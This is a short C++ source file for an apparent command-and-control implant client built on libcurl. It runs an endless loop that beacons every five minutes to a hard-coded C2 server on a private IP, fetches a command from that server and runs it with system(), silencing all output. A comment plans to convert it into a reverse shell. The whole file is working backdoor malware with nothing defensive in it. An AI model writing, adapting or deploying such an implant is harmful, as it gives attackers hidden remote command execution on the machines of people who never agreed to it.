// g++ -o client client.cpp -lcurl
#include <iostream>
#include <curl/curl.h>
#include <curl/easy.h>
#include <chrono>
#include <thread>
#include <sstream>

//
// TODO: change from bind cmd to reverse shell listener
//

#define C2URL "http://10.0.0.109:8080/beacon"
#define SHELLURL "http://10.0.0.109:8080/beacon/getcmd/linux"
#define PORT 8080

size_t WriteCallback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    std::ostringstream* stream = static_cast<std::ostringstream*>(userdata);
    size_t count = size * nmemb;
    stream->write(ptr, count);
    return count;
}

void sendbeacon(CURL *curl) {
    const long curltimeout = 5;
    const char* curlagent = "beacon";
    curl_easy_setopt(curl, CURLOPT_URL, C2URL);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, curltimeout);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, curlagent);
    if (curl_easy_perform(curl) != CURLE_OK) {
        std::cerr << "CE1V2; curl error => perform failed" << std::endl;
    }
}

int pullcmd(CURL *curl) {
    std::ostringstream response;
    curl_easy_setopt(curl, CURLOPT_URL, SHELLURL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    if (curl_easy_perform(curl) != CURLE_OK) {
        std::cerr << "CE1V3; curl error => perform failed" << std::endl;
        return 1;
    }
    std::string cmd = response.str();
    if(!cmd.empty()) {
        std::string cmdlogdrop = cmd + "> /dev/null 2>&1";
        system(cmdlogdrop.c_str());
    }
    return 0;
}

int main() {
    while(true){
        std::this_thread::sleep_for(std::chrono::minutes(5));
        CURL *curl = curl_easy_init();
        if (!curl) {
            std::cerr << "CE1V4; curl error => failed to init in main" << std::endl;
            continue;
        }
        sendbeacon(curl);
        pullcmd(curl);
        curl_easy_cleanup(curl);
        continue;
    }
    return 0;
}
